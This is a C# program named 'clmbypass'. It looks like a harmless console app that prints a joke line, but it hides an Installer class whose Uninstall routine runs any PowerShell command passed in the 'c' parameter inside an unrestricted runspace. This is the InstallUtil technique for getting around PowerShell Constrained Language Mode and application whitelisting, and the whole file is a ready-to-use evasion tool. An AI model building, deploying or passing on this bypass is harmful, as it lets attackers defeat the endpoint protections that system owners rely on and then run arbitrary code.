using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.ComponentModel;

namespace clmbypass
{
    class Program
    {
        static void Main() => Console.WriteLine("Asuka Soryu is best girl.");
    }

    [RunInstaller(true)]
    public class SecureInstaller : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            var command = Context.Parameters["c"];
            if (string.IsNullOrWhiteSpace(command))
            {
                Console.WriteLine("/c parameter missing.");
                return;
            }

            try
            {
                PowershellExec(command);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
        private void PowershellExec(string command)
        {
            using (var runspace = RunspaceFactory.CreateRunspace())
            using (var ps = PowerShell.Create())
            {
                runspace.Open();
                ps.Runspace = runspace;
                ps.AddScript(command);
                var results = ps.Invoke();
                if (ps.Streams.Error.Count > 0)
                {
                    foreach (var error in ps.Streams.Error)
                    {
                        Console.WriteLine($"Error: {error}");
                    }
                }
                else
                {
                    foreach (var result in results)
                    {
                        Console.WriteLine(result);
                    }
                }
            }
        }
    }
}